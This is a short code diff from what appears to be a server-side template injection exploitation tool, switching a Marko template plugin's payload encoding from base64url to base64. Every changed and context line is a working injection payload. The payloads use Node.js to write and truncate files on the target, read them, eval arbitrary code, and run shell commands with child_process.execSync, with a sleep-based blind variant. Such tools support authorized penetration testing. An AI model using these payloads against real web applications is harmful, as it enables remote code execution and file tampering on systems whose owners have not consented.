@@ -14,7 +14,7 @@ class Marko(javascript.Javascript):
             },
             'write': {
                 'call': 'inject',
-                'write': """${{require('fs').appendFileSync('{path}',Buffer('{chunk_b64}','base64url'),'binary')}}""",
+                'write': """${{require('fs').appendFileSync('{path}',Buffer('{chunk_b64p}','base64'),'binary')}}""",
                 'truncate': """${{require('fs').writeFileSync('{path}','')}}"""
             },
             'read': {
@@ -25,14 +25,14 @@ class Marko(javascript.Javascript):
                 'md5': "${{require('crypto').createHash('md5').update(require('fs').readFileSync('{path}')).digest(\"hex\")}}"
             },
             'evaluate': {
-                'evaluate': """${{eval(Buffer('{code_b64}', 'base64url').toString())}}"""
+                'evaluate': """${{eval(Buffer('{code_b64p}', 'base64').toString())}}"""
             },
             'execute': {
-                'execute': """${{require('child_process').execSync(Buffer('{code_b64}', 'base64url').toString())}}"""
+                'execute': """${{require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())}}"""
             },
             'execute_blind': {
                 'call': 'inject',
-                'execute_blind': """${{require('child_process').execSync(Buffer('{code_b64}', 'base64url').toString() + ' && sleep {delay}')}}"""
+                'execute_blind': """${{require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')}}"""
             },
         })
 
